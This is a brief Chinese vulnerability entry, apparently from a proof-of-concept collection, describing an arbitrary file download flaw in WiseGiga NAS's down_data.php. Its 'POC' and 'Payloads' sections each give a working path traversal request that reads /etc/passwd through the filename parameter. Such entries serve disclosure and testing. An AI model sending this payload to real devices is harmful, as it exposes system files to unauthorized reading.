# WiseGiga NAS down_data.php 任意文件下载漏洞

## 漏洞描述
WiseGiga 是一家销售网络连接存储（NAS ）产品的韩国公司。

WISEGIGA NAS down_data.php 存在任意文件下载漏洞，由于 /down_data.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
主页面

![image-20220628113649787](images/202206281136917.png)

验证POC

```
/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
```


## Payloads
```
/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
```
